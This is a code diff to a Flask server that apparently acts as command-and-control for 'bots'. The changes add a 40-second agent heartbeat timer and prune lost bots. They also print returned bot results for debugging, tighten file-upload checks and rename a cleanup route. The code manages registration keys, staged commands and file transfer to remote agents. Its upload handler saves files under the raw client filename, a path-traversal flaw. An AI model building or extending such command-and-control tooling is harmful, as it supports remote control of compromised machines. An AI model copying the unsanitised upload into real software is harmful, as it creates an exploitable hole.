@@ -30,7 +30,7 @@ app.config.from_object("config.ProdConfig")
 db.app = app
 db.init_app(app)
 
-UPLOAD_DIRECTORY="./uploads"
+UPLOAD_DIRECTORY=app.config.get("UPLOAD_FOLDER")
 if not os.path.exists(UPLOAD_DIRECTORY):
     os.makedirs(UPLOAD_DIRECTORY)
 
@@ -44,6 +44,9 @@ PORT = app.config.get("PORT")
 FIRSTCONTACTKEY = app.config.get("FIRSTCONTACTKEY")
 REGISTERKEY = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))
 MASTERKEY = app.config.get("MASTERKEY")
+
+# Agent timer 
+TIMER = 40
 
 
 # TODO: Create a separate api.py and then import into the init.py file? 
@@ -356,6 +359,7 @@ def botresult(bot_id):
         if 'registerkey' in data:
             if data['registerkey'] == REGISTERKEY:
                 result = data['result']
+                print("[DEBUG] result = ", result)
 
                 query_bot = Bot.query.filter_by(id=bot_id).first()
                 command = Command.query.filter_by(bot_id=query_bot.id).order_by(Command.id.desc()).first()
@@ -404,8 +408,9 @@ def refresh():
         return ''
 
     try:
+        # If bot missed three heartbeat interval (default is 40seconds*3 = 120 seconds), then remove the bot. We lost it. 
         for bot in botlist:
-            if (datetime.now() - bot.timestamp).total_seconds() > 30:
+            if (datetime.now() - bot.timestamp).total_seconds() > TIMER*3:
                 db.session.delete(bot)
         db.session.commit()
     except Exception as e:
@@ -434,7 +439,7 @@ def botlist():
 
     # Refresh bot list. Remove bot if it hasn't come back for TIMER*5 
     for bot in botlist:
-        if (datetime.now() - bot.timestamp).total_seconds() > 30:
+        if (datetime.now() - bot.timestamp).total_seconds() > TIMER*3:
             db.session.delete(bot)
     db.session.commit()
 
@@ -526,10 +531,16 @@ def upload_file():
     if error is not True:
         return error 
 
+    if 'file' not in request.files:
+        return jsonify({'error': '[-] No file part'})
+    
     uploaded_file = request.files['file']
 
+    if uploaded_file.filename == '':
+        return jsonify({'error': '[-] No selected file to upload'})
+
     try:
-        uploaded_file.save(os.path.join(app.config['UPLOAD_FOLDER'], uploaded_file))
+        uploaded_file.save(os.path.join(UPLOAD_DIRECTORY, uploaded_file.filename))
     except Exception as e:
         return jsonify({'error': str(e)})
     
@@ -550,7 +561,7 @@ def download_file(filename):
     return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
 
 
-@app.route('/cleanup', methods=['POST'])
+@app.route('/bot/cleanup', methods=['POST'])
 def cleanup():
     """
     Description: Clean up all of the staged commands. Start fresh! 
